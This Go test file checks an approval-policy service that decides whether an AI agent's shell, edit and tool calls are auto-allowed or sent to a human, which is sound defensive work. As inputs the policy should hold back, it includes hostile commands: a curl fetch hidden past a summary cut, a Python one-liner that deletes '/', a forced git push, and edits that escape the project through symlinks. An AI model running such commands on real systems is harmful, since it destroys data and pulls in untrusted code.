package approvals

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/jclement/crowsnest/internal/risk"
	"github.com/jclement/crowsnest/internal/store"
)

// policyHarness is a service whose calls come from project 1 ("Crowsnest"); job j_1 is live,
// rooted at /work/crow; j_9 has ended; the lead's pane "lead" holds no job.
type policyHarness struct {
	*harness
	ended map[string]bool
	root  string // a real directory standing for /work/crow (edit rules compare real paths, R6-C03)
}

func newPolicyHarness(t *testing.T) *policyHarness {
	t.Helper()
	root, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	for _, dir := range []string{"internal/x", "cmd", "docs", "internal2"} {
		if err := os.MkdirAll(filepath.Join(root, dir), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	h := &policyHarness{harness: newHarness(t), ended: map[string]bool{"j_9": true}, root: root}
	h.service.opts.Scope = func(_ context.Context, jobID, paneID string) Scope {
		switch {
		case jobID != "":
			return Scope{ProjectID: 1, ProjectName: "Crowsnest", JobLive: !h.ended[jobID], Root: root}
		case paneID == "lead":
			return Scope{ProjectID: 1, ProjectName: "Crowsnest", Root: root}
		}
		return Scope{}
	}
	return h
}

func (h *policyHarness) projectRule(t *testing.T, kind, pattern string, maxRisk risk.Level) Rule {
	t.Helper()
	rule, err := h.service.AddProjectRule(context.Background(), 1, RuleInput{Kind: kind, Pattern: pattern, MaxRisk: maxRisk})
	if err != nil {
		t.Fatal(err)
	}
	return rule
}

func (h *policyHarness) jobRule(t *testing.T, jobID, kind, pattern string, maxRisk risk.Level) Rule {
	t.Helper()
	rule, err := h.service.addRule(context.Background(), store.ApprovalRuleRecord{Scope: ScopeJob, ProjectID: 1, JobID: jobID},
		RuleInput{Kind: kind, Pattern: pattern, MaxRisk: maxRisk})
	if err != nil {
		t.Fatal(err)
	}
	return rule
}

func (h *policyHarness) ask(t *testing.T, jobID, paneID, tool string, input map[string]any) Approval {
	t.Helper()
	for key, value := range input {
		if text, ok := value.(string); ok && strings.HasPrefix(text, "/work/crow") {
			input[key] = h.root + strings.TrimPrefix(text, "/work/crow")
		}
	}
	body, _ := json.Marshal(input)
	approval, err := h.service.Request(context.Background(), RequestInput{JobID: jobID, PaneID: paneID, ToolName: tool, ToolInput: body, Hooked: true})
	if err != nil {
		t.Fatal(err)
	}
	return approval
}

func TestPolicyEvaluation(t *testing.T) {
	cases := []struct {
		name  string
		setup func(t *testing.T, h *policyHarness)
		job   string
		pane  string
		tool  string
		input map[string]any
		allow bool
		rule  string // a fragment of the reason, when allowed
	}{
		{name: "a project bash rule", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "go test *", risk.Low) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": "go test ./..."}, allow: true, rule: "(project Crowsnest): Bash commands matching `go test *`"},
		{name: "no rule asks a human", job: "j_1", tool: "Bash", input: map[string]any{"command": "go test ./..."}},
		{name: "glob is anchored", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "go test *", risk.Low) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": "sudo go test ./..."}},
		{name: "dangerous never, even matching", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "git push *", risk.Elevated) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": "git push --force origin main"}},
		{name: "elevated needs an elevated rule", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "git push *", risk.Low) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": "git push origin feature/x"}},
		{name: "elevated with an elevated rule", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "git push *", risk.Elevated) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": "git push origin feature/x"}, allow: true},
		{name: "job rule before project rule", setup: func(t *testing.T, h *policyHarness) {
			h.projectRule(t, KindBash, "go test *", risk.Low)
			h.jobRule(t, "j_1", KindBash, "go *", risk.Low)
		}, job: "j_1", tool: "Bash", input: map[string]any{"command": "go test ./..."}, allow: true, rule: "(job j_1): Bash commands matching `go *`"},
		{name: "a job rule ignored once the job ended", setup: func(t *testing.T, h *policyHarness) { h.jobRule(t, "j_9", KindBash, "go test *", risk.Low) },
			job: "j_9", tool: "Bash", input: map[string]any{"command": "go test ./..."}},
		{name: "another job's rule does not apply", setup: func(t *testing.T, h *policyHarness) { h.jobRule(t, "j_2", KindBash, "go test *", risk.Low) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": "go test ./..."}},
		{name: "revoked rule never applies", setup: func(t *testing.T, h *policyHarness) {
			rule := h.projectRule(t, KindBash, "go test *", risk.Low)
			if _, err := h.service.RevokeRule(context.Background(), rule.ID); err != nil {
				t.Fatal(err)
			}
		}, job: "j_1", tool: "Bash", input: map[string]any{"command": "go test ./..."}},
		{name: "compound: every command must match", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "go test *", risk.Low) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": "go test ./... && go vet ./..."}},
		{name: "compound: each matched by some rule", setup: func(t *testing.T, h *policyHarness) {
			h.projectRule(t, KindBash, "go test *", risk.Low)
			h.projectRule(t, KindBash, "tail *", risk.Low)
		}, job: "j_1", tool: "Bash", input: map[string]any{"command": "go test ./... 2>&1 | tail -20"}, allow: true, rule: "`tail *`"},
		{name: "compound with ; and newline", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "go test *", risk.Low) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": "go test ./a; go test ./b\ngo test ./c"}, allow: true},
		{name: "command substitution", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "go test *", risk.Low) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": "go test $(go list ./...)"}},
		{name: "backticks", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "go test *", risk.Low) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": "go test `cat pkgs`"}},
		{name: "process substitution", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "diff *", risk.Low) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": "diff <(ls a) b"}},
		{name: "eval", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "*test*", risk.Low) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": "eval go test"}},
		{name: "redirect to a file", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "go test *", risk.Low) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": "go test ./... > out.txt"}},
		{name: "append to a file", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "go test *", risk.Low) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": "go test ./... >>log"}},
		{name: "redirect to /dev/null", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "go test *", risk.Low) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": "go test ./... 2>/dev/null"}, allow: true},
		{name: "a quoted > is not a redirect", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "grep *", risk.Low) },
			job: "j_1", tool: "Bash", input: map[string]any{"command": `grep "a > b" notes.txt`}, allow: true},
		{name: "edit inside the pattern", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindEdit, "internal/", risk.Low) },
			job: "j_1", tool: "Edit", input: map[string]any{"file_path": "/work/crow/internal/x/y.go"}, allow: true, rule: "edits under `internal/`"},
		{name: "edit escaping with ..", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindEdit, "internal", risk.Low) },
			job: "j_1", tool: "Write", input: map[string]any{"file_path": "/work/crow/internal/../cmd/main.go"}},
		{name: "edit outside the root", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindEdit, ".", risk.Elevated) },
			job: "j_1", tool: "Edit", input: map[string]any{"file_path": "/etc/hosts"}},
		{name: "edit with a relative path", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindEdit, ".", risk.Low) },
			job: "j_1", tool: "Edit", input: map[string]any{"file_path": "internal/x.go"}},
		{name: "a sibling directory with the same prefix", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindEdit, "internal", risk.Low) },
			job: "j_1", tool: "Edit", input: map[string]any{"file_path": "/work/crow/internal2/x.go"}},
		{name: "notebook edit", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindEdit, ".", risk.Low) },
			job: "j_1", tool: "NotebookEdit", input: map[string]any{"notebook_path": "/work/crow/a.ipynb"}, allow: true},
		{name: "tool exact", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindTool, "WebSearch", risk.Low) },
			job: "j_1", tool: "WebSearch", input: map[string]any{"query": "x"}, allow: true, rule: "the tool `WebSearch`"},
		{name: "tool prefix (MCP is elevated)", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindTool, "mcp__github__*", risk.Elevated) },
			job: "j_1", tool: "mcp__github__create_issue", input: map[string]any{"title": "x"}, allow: true},
		{name: "tool prefix does not reach other servers", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindTool, "mcp__github__*", risk.Elevated) },
			job: "j_1", tool: "mcp__slack__post", input: map[string]any{}},
		{name: "a lead's own call: project rules apply", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindEdit, "docs", risk.Low) },
			pane: "lead", tool: "Edit", input: map[string]any{"file_path": "/work/crow/docs/a.md"}, allow: true},
		{name: "a call with no job or project", setup: func(t *testing.T, h *policyHarness) { h.projectRule(t, KindBash, "ls*", risk.Low) },
			pane: "orchestrator", tool: "Bash", input: map[string]any{"command": "ls"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			h := newPolicyHarness(t)
			if tc.setup != nil {
				tc.setup(t, h)
			}
			pane := tc.pane
			if pane == "" {
				pane = "p1"
			}
			approval := h.ask(t, tc.job, pane, tc.tool, tc.input)
			if !tc.allow {
				if approval.Status != StatusPending {
					t.Fatalf("want a human asked (pending), got %s: %s", approval.Status, approval.StatusReason)
				}
				return
			}
			if approval.Status != StatusAllowed || approval.DecidedVia != ViaPolicy || len(approval.RuleIDs) == 0 {
				t.Fatalf("want allowed by policy, got %+v", approval)
			}
			if !strings.HasPrefix(approval.StatusReason, "Allowed by rule r_") || !strings.Contains(approval.StatusReason, tc.rule) {
				t.Fatalf("reason %q, want it to name %q", approval.StatusReason, tc.rule)
			}
			if out := HookOutput(approval); !strings.Contains(out, `"behavior":"allow"`) {
				t.Fatalf("hook output %s", out)
			}
		})
	}
}

func TestPolicyAllowIsAnnouncedAsAllowed(t *testing.T) {
	h := newPolicyHarness(t)
	h.projectRule(t, KindBash, "go test *", risk.Low)
	approval := h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "go test ./..."})
	h.mu.Lock()
	defer h.mu.Unlock()
	if strings.Join(h.changes, ",") != approval.ID+":allowed" {
		t.Fatalf("changes %v: an auto-allow is announced as allowed, never requested", h.changes)
	}
	if h.service.PendingForJob(context.Background(), "j_1") {
		t.Fatal("an auto-allowed call never shows as pending")
	}
}

func TestNormalizeRule(t *testing.T) {
	cases := []struct {
		kind, pattern string
		max           risk.Level
		want          string // canonical pattern; "" means refused
		message       string // a fragment of the refusal
	}{
		{KindBash, " go test * ", risk.Low, "go test *", ""},
		{KindBash, "*", risk.Low, "", "every command"},
		{KindBash, "a\nb", risk.Low, "", "one line"},
		{KindBash, "ls", risk.Dangerous, "", "never allows a dangerous"},
		{KindEdit, "internal/", risk.Low, "internal", ""},
		{KindEdit, ".", risk.Low, ".", ""},
		{KindEdit, "../x", risk.Low, "", "cannot leave"},
		{KindEdit, "a/../..", risk.Low, "", "cannot leave"},
		{KindEdit, "/etc", risk.Low, "", "not an absolute path"},
		{KindTool, "mcp__github__*", risk.Elevated, "mcp__github__*", ""},
		{KindTool, "*", risk.Low, "", "a prefix"},
		{KindTool, "Bash", risk.Low, "", "Use a bash or edit rule"},
		{KindTool, "mc*p", risk.Low, "", "a prefix"},
		{"shell", "ls", risk.Low, "", "bash, edit or tool"},
		{KindBash, "", risk.Low, "", "required"},
	}
	for _, tc := range cases {
		got, err := NormalizeRule(tc.kind, tc.pattern, tc.max)
		if tc.want != "" {
			if err != nil || got != tc.want {
				t.Errorf("%s %q: got %q %v, want %q", tc.kind, tc.pattern, got, err, tc.want)
			}
			continue
		}
		var ruleErr *RuleError
		if !errors.As(err, &ruleErr) || !strings.Contains(err.Error(), tc.message) {
			t.Errorf("%s %q: got %v, want a refusal saying %q", tc.kind, tc.pattern, err, tc.message)
		}
	}
}

func TestGlob(t *testing.T) {
	cases := []struct {
		pattern, text string
		want          bool
	}{
		{"go test *", "go test ./...", true},
		{"go test *", "go test", false},
		{"go test *", "go testing", false},
		{"*", "", true},
		{"a*b*c", "a-x-b-y-c", true},
		{"a*b*c", "a-x-c-y-b", false},
		{"npm run *", "npm run lint --fix", true},
		{"ls", "ls -la", false},
	}
	for _, tc := range cases {
		if got := Glob(tc.pattern, tc.text); got != tc.want {
			t.Errorf("Glob(%q, %q) = %v, want %v", tc.pattern, tc.text, got, tc.want)
		}
	}
}

func TestSuggest(t *testing.T) {
	cases := []struct {
		tool  string
		input string
		want  Suggestion
	}{
		{"Bash", `{"command":"go test ./internal/... -run X"}`, Suggestion{Kind: KindBash, Pattern: "go test *"}},
		{"Bash", `{"command":"ls"}`, Suggestion{Kind: KindBash, Pattern: "ls"}},
		{"Edit", `{"file_path":"/work/crow/internal/x/y.go"}`, Suggestion{Kind: KindEdit, Pattern: "internal/x/"}},
		{"Write", `{"file_path":"/work/crow/README.md"}`, Suggestion{Kind: KindEdit, Pattern: "."}},
		{"WebFetch", `{"url":"https://example.com"}`, Suggestion{Kind: KindTool, Pattern: "WebFetch"}},
	}
	for _, tc := range cases {
		if got := Suggest(tc.tool, json.RawMessage(tc.input), "/work/crow"); got != tc.want {
			t.Errorf("Suggest(%s %s) = %+v, want %+v", tc.tool, tc.input, got, tc.want)
		}
	}
}

func TestRemember(t *testing.T) {
	ctx := context.Background()
	h := newPolicyHarness(t)
	first := h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "go test ./a"})
	if first.Remember == nil || first.Remember.Pattern != "go test *" {
		t.Fatalf("suggestion %+v", first.Remember)
	}
	second := h.ask(t, "j_1", "p2", "Bash", map[string]any{"command": "go test ./b"})
	other := h.ask(t, "j_1", "p3", "Bash", map[string]any{"command": "make lint"})
	elsewhere := h.ask(t, "j_2", "p4", "Bash", map[string]any{"command": "go test ./c"})

	pattern := "go test *"
	allowed, err := h.service.Decide(ctx, first.ID, Decision{Allow: true, Remember: &pattern})
	if err != nil || allowed.Status != StatusAllowed || allowed.DecidedVia != ViaBrowser {
		t.Fatalf("remember: %+v %v", allowed, err)
	}
	rules, _ := h.service.ListRules(ctx, RuleFilter{JobID: "j_1"})
	if len(rules) != 1 || rules[0].Scope != ScopeJob || rules[0].Pattern != "go test *" || rules[0].MaxRisk != risk.Low {
		t.Fatalf("job rules %+v", rules)
	}
	if got, _ := h.service.Get(ctx, second.ID); got.Status != StatusAllowed || got.DecidedVia != ViaPolicy {
		t.Fatalf("the job's other matching call: %+v", got)
	}
	if got, _ := h.service.Get(ctx, other.ID); got.Status != StatusPending {
		t.Fatalf("a call the rule does not match stays: %s", got.Status)
	}
	if got, _ := h.service.Get(ctx, elsewhere.ID); got.Status != StatusPending {
		t.Fatalf("another job's call stays: %s", got.Status)
	}
	if next := h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "go test ./d"}); next.Status != StatusAllowed {
		t.Fatalf("the next matching call of the job: %s", next.Status)
	}
}

func TestRememberRefusals(t *testing.T) {
	ctx := context.Background()
	h := newPolicyHarness(t)
	pattern := "git push *"
	var refusal *RefusedError

	dangerous := h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "git push --force origin main"})
	if _, err := h.service.Decide(ctx, dangerous.ID, Decision{Allow: true, Confirmed: true, Remember: &pattern}); !errors.As(err, &refusal) {
		t.Fatalf("remember on a dangerous call: %v", err)
	}
	if dangerous.Remember != nil {
		t.Fatal("a dangerous call offers no remember")
	}
	noJob := h.ask(t, "", "lead", "Bash", map[string]any{"command": "ls"})
	ls := "ls"
	if _, err := h.service.Decide(ctx, noJob.ID, Decision{Allow: true, Remember: &ls}); !errors.As(err, &refusal) {
		t.Fatalf("remember without a job: %v", err)
	}
	low := h.ask(t, "j_1", "p2", "Bash", map[string]any{"command": "ls"})
	if _, err := h.service.Decide(ctx, low.ID, Decision{Allow: false, Remember: &ls}); !errors.As(err, &refusal) {
		t.Fatalf("remember on a deny: %v", err)
	}
	star := "*"
	var ruleErr *RuleError
	if _, err := h.service.Decide(ctx, low.ID, Decision{Allow: true, Remember: &star}); !errors.As(err, &ruleErr) {
		t.Fatalf("a bad pattern: %v", err)
	}
	for _, id := range []string{dangerous.ID, noJob.ID, low.ID} {
		if got, _ := h.service.Get(ctx, id); got.Status != StatusPending {
			t.Fatalf("%s must stay pending after a refused remember: %s", id, got.Status)
		}
	}
}

// TestElevatedIsRememberedOnlyExactly is R6-S1: remembering an elevated call never makes a
// prefix rule. An interpreter one-liner (elevated only because crowsnest does not recognise it)
// offers no remember at all, and is refused; a recognised elevated call offers itself, word for
// word, and a wider pattern is refused; the exact rule then allows that call and nothing else.
func TestElevatedIsRememberedOnlyExactly(t *testing.T) {
	ctx := context.Background()
	h := newPolicyHarness(t)
	var refusal *RefusedError

	oneLiner := h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "python3 -c 'print(1)'"})
	if oneLiner.Risk != risk.Elevated || oneLiner.Remember != nil {
		t.Fatalf("an unrecognised elevated call offered %+v (%s)", oneLiner.Remember, oneLiner.Risk)
	}
	wide := "python3 -c *"
	if _, err := h.service.Decide(ctx, oneLiner.ID, Decision{Allow: true, Remember: &wide}); !errors.As(err, &refusal) {
		t.Fatalf("remembering an interpreter one-liner: %v", err)
	}

	push := h.ask(t, "j_1", "p2", "Bash", map[string]any{"command": "git push origin feature/x"})
	if push.Risk != risk.Elevated || push.Remember == nil || !push.Remember.Exact || push.Remember.Pattern != "git push origin feature/x" {
		t.Fatalf("a recognised elevated call offered %+v", push.Remember)
	}
	widePush := "git push *"
	if _, err := h.service.Decide(ctx, push.ID, Decision{Allow: true, Remember: &widePush}); !errors.As(err, &refusal) {
		t.Fatalf("a wildcard for an elevated call: %v", err)
	}
	exact := "git push origin feature/x"
	if _, err := h.service.Decide(ctx, push.ID, Decision{Allow: true, Remember: &exact}); err != nil {
		t.Fatal(err)
	}
	if again := h.ask(t, "j_1", "p3", "Bash", map[string]any{"command": "git push origin feature/x"}); again.Status != StatusAllowed {
		t.Fatalf("the exact call again: %s", again.Status)
	}
	if other := h.ask(t, "j_1", "p4", "Bash", map[string]any{"command": "git push origin main"}); other.Status != StatusPending {
		t.Fatalf("another push was allowed by the exact rule: %s", other.Status)
	}
	if spoof := h.ask(t, "j_1", "p5", "Bash", map[string]any{"command": "python3 -c 'import shutil;shutil.rmtree(\"/\")'"}); spoof.Status != StatusPending {
		t.Fatalf("an interpreter call was allowed: %s", spoof.Status)
	}
}

func TestBatchAllow(t *testing.T) {
	ctx := context.Background()
	h := newPolicyHarness(t)
	a := h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "ls"})
	b := h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "pwd"})
	elevated := h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "git push origin x"})
	otherJob := h.ask(t, "j_2", "p2", "Bash", map[string]any{"command": "ls"})
	var refusal *RefusedError
	for name, ids := range map[string][]string{
		"not low":    {a.ID, elevated.ID},
		"mixed jobs": {a.ID, otherJob.ID},
		"twice":      {a.ID, a.ID},
		"unknown":    {a.ID, "ap_999"},
		"empty":      {},
	} {
		if _, err := h.service.BatchAllow(ctx, ids); !errors.As(err, &refusal) {
			t.Fatalf("%s: %v, want a refusal", name, err)
		}
		if got, _ := h.service.Get(ctx, a.ID); got.Status != StatusPending {
			t.Fatalf("%s: nothing may be allowed, but %s is %s", name, a.ID, got.Status)
		}
	}
	allowed, err := h.service.BatchAllow(ctx, []string{a.ID, b.ID})
	if err != nil || len(allowed) != 2 {
		t.Fatalf("batch: %v %v", allowed, err)
	}
	for _, approval := range allowed {
		if approval.Status != StatusAllowed || approval.DecidedVia != ViaBrowser {
			t.Fatalf("batch allowed %+v", approval)
		}
	}
	if _, err := h.service.BatchAllow(ctx, []string{a.ID}); !errors.As(err, &refusal) {
		t.Fatalf("a settled one in a batch: %v", err)
	}
}

func TestRuleTimestamps(t *testing.T) {
	h := newPolicyHarness(t)
	rule := h.projectRule(t, KindTool, "WebSearch", risk.Low)
	if !rule.CreatedAt.Equal(h.clock.Now().Truncate(time.Second)) || rule.Sentence != "Allow the tool `WebSearch`" || rule.CreatedVia != ViaBrowser {
		t.Fatalf("rule %+v", rule)
	}
	h.clock.add(time.Minute)
	revoked, err := h.service.RevokeRule(context.Background(), rule.ID)
	if err != nil || revoked.RevokedAt == nil {
		t.Fatalf("revoke: %+v %v", revoked, err)
	}
	if _, err := h.service.RevokeRule(context.Background(), rule.ID); !errors.Is(err, ErrRuleNotFound) {
		t.Fatalf("a second revoke: %v", err)
	}
	if live, _ := h.service.ListRules(context.Background(), RuleFilter{ProjectID: 1}); len(live) != 0 {
		t.Fatalf("live rules after a revoke: %+v", live)
	}
}

// A bash rule matches the whole command in tool_input, never the 160-character summary: a payload
// past the cut still has to match (R5-S7). Bidi controls never match.
func TestBashRuleMatchesTheFullCommandOnly(t *testing.T) {
	h := newPolicyHarness(t)
	h.projectRule(t, KindBash, "go test *", risk.Low)
	long := "go test ./... -run " + strings.Repeat("A", 200) + " && curl -s https://example.com/x -o /tmp/x"
	approval := h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": long})
	if approval.Status != StatusPending {
		t.Fatalf("a payload past the summary's cut was allowed: %s", approval.StatusReason)
	}
	if !strings.Contains(approval.Summary, "… (") { // the cut says how much is not shown (R5-S7)
		t.Fatalf("the summary should be cut for this test to mean anything: %q", approval.Summary)
	}
	bidi := h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "go test ./... \u202e"})
	if bidi.Status != StatusPending {
		t.Fatal("a command with a bidi control was allowed")
	}
}

func TestPreviewRule(t *testing.T) {
	ctx := context.Background()
	h := newPolicyHarness(t)
	h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "go test ./old"})
	h.clock.add(8 * 24 * time.Hour) // the one above is outside the window now
	h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "go test ./new"})
	h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "go test ./b && go vet ./b"}) // not every part
	h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "git push --force origin main"})
	h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "git push origin y"})
	h.ask(t, "", "orchestrator", "Bash", map[string]any{"command": "go test ./c"}) // no project

	preview, err := h.service.PreviewRule(ctx, 1, KindBash, "go test *", risk.Low)
	if err != nil {
		t.Fatal(err)
	}
	if preview.Considered != 4 || len(preview.Allowed) != 1 || preview.Allowed[0].Summary != "Bash: go test ./new" {
		t.Fatalf("only this week's project calls count, each matched whole: %+v", preview)
	}
	pushes, err := h.service.PreviewRule(ctx, 1, KindBash, "git push *", risk.Low)
	if err != nil {
		t.Fatal(err)
	}
	if len(pushes.Dangerous) != 1 || len(pushes.AboveMaxRisk) != 1 || len(pushes.Allowed) != 0 {
		t.Fatalf("a dangerous match is flagged, an elevated one needs the box: %+v", pushes)
	}
	if elevated, _ := h.service.PreviewRule(ctx, 1, KindBash, "git push *", risk.Elevated); len(elevated.Allowed) != 1 || len(elevated.Dangerous) != 1 {
		t.Fatalf("with also-when-elevated: %+v", elevated)
	}
	var ruleErr *RuleError
	if _, err := h.service.PreviewRule(ctx, 1, KindBash, "*", risk.Low); !errors.As(err, &ruleErr) {
		t.Fatalf("a bad pattern is refused in the preview too: %v", err)
	}
}

// TestEditRuleDoesNotFollowALinkOut is R6-C03 (and R6-I4): a rule for edits under internal/ does
// not cover a file reached through a link inside internal/ that points elsewhere, even when the
// target is still inside the job's root; an elevated rule cannot reach outside the root that way
// either. A path that does not exist yet, inside the directory, still matches.
func TestEditRuleDoesNotFollowALinkOut(t *testing.T) {
	h := newPolicyHarness(t)
	h.projectRule(t, KindEdit, "internal/", risk.Elevated)
	if err := os.Symlink(filepath.Join(h.root, "cmd"), filepath.Join(h.root, "internal", "shared")); err != nil {
		t.Fatal(err)
	}
	outside := t.TempDir()
	if err := os.Symlink(outside, filepath.Join(h.root, "internal", "away")); err != nil {
		t.Fatal(err)
	}
	for _, path := range []string{"/work/crow/internal/shared/main.go", "/work/crow/internal/away/x.go", "/work/crow/internal/away/../x.go"} {
		if got := h.ask(t, "j_1", "p1", "Edit", map[string]any{"file_path": path}); got.Status != StatusPending {
			t.Fatalf("%s through a link was allowed by the internal/ rule: %s", path, got.Status)
		}
	}
	if got := h.ask(t, "j_1", "p1", "Edit", map[string]any{"file_path": "/work/crow/internal/x/new.go"}); got.Status != StatusAllowed {
		t.Fatalf("a new file inside internal/: %s", got.Status)
	}
}
